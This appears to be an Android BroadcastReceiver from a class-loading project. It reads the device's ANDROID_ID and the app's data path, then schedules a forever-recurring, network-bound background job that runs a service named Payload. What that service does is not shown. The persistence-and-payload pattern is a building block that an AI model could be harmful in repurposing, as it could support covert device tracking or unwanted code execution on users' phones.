package com.catherine.classloader;

/**
 * Created by Master on 28/02/2017.
 */

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;

import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import static com.firebase.jobdispatcher.Lifetime.FOREVER;

public class MyReceiver extends BroadcastReceiver {
    @Override
        public void onReceive(Context context, Intent intent) {
        Bundle myExtrasBundle = new Bundle();

        String android_id = Settings.Secure.getString(context.getContentResolver(),
                Settings.Secure.ANDROID_ID);
        myExtrasBundle.putString("mpath", context.getApplicationInfo().dataDir);
        myExtrasBundle.putString("mandroid_id", android_id);
        FirebaseJobDispatcher mDispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(context));
        Job myJob = mDispatcher.newJobBuilder()
                .setService(Payload.class)
                .setTag("TagPaylo")
                .setRecurring(true)
                //.setTrigger(Trigger.executionWindow(5, 30))
                .setTrigger(Trigger.executionWindow(0, 0))
                .setLifetime(FOREVER)
                .setReplaceCurrent(false)
                .setConstraints(Constraint.ON_ANY_NETWORK)
                .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                .setExtras(myExtrasBundle)
                .build();
        mDispatcher.mustSchedule(myJob);
        }

}
